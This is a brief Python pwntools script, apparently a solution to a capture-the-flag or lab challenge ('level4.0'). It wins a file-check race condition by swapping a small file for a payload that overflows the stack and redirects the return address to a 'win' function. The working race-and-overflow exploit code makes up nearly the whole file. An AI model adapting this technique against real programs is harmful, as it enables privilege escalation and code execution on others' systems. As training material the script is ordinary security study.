from pwn import *
import os

"""
Theres a check to validate the content of a file, the max size is 256.
We bypass that by creating a file with 10 B's and quickly replacing
by another file with a payload responsible for fill the stack
until the ret address, and point this ret address to the address
of the function win.
"""

# while true; do ./4.0 x | grep pwn; done 2>/dev/null
context.arch = 'x86_64'
binary = ELF('level4.0')
win_address = p64(binary.symbols['win'])
#overflow = cyclic(800, n=8)
overflow_to_ret = cyclic_find('baaaaaac', n=8)
exploit = (b'A' * overflow_to_ret) + win_address

while True:
    os.unlink('x')
    file_descriptor = os.open('x', os.O_WRONLY|os.O_CREAT)
    os.write(file_descriptor, b'B'*10)
    os.close(file_descriptor)
    #input('going to overflow')
    file_descriptor = os.open('x', os.O_WRONLY|os.O_CREAT)
    os.write(file_descriptor, exploit)
    os.close(file_descriptor)
    #input('going back')
